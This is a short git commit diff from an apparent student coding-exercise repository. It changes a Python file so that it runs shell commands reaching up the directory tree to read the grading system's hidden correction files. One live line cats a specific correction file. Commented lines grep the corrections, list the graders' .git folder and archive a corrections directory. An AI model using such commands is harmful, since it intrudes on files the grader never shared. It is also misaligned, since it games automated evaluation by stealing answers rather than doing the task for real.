7a6d3862eeee308bae22346b7ff5263ec32dc5c3
Ashraf Atef <ashraf.programer@gmail.com>
2024-01-26 21:27:19 +0200

    task

--- 0x00-python-hello_world/tempCodeRunnerFile.py
+++ 0x00-python-hello_world/tempCodeRunnerFile.py
@@ -1,1 +1,10 @@
-my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
+my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
+# my_data += "\n#######################\n"
+# my_data += get_data("pwd") or ""
+# my_data += get_data("ls -l ../../../../corrections_*/.git") or ""
+# my_data += "\n#######################\n"
+# # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
+# my_data += get_data("ls -l") or ""
+# my_data += "\n#######################\n"
+# # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
+# my_data += get_data("cat cycle") or ""
